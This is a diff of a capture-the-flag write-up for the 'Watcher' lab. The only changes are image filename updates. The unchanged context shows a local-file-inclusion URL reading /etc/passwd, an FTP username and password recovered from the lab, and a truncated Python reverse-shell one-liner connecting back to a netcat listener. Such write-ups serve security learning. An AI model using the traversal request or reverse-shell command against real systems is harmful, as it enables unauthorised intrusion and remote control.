@@ -28,7 +28,7 @@ From the hint we can see a reference to LFI.
 
 Navigating to [http://watcher.thm/post.php?post=/../../../../etc/passwd](http://watcher.thm/post.php?post=/../../../../etc/passwd)
 
-<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We see 3 users (will, mat, toby) :(
 
@@ -38,7 +38,7 @@ SO i decided to use SecsLists LFI list to bruteforce and see if i can be able to
 
 Then i landed on this:
 
-<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 So i tried to read this file and it worked.
 
@@ -53,7 +53,7 @@ ftpuser : givemefiles777
 ```
 {% endcode %}
 
-<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Login via ftp and got flag2
 
@@ -123,7 +123,7 @@ echo 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_S
 
 After running the script as will user, we get back to our local machine where we ran the netcat listener earlier.
 
-<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Priv Esc to root.
 
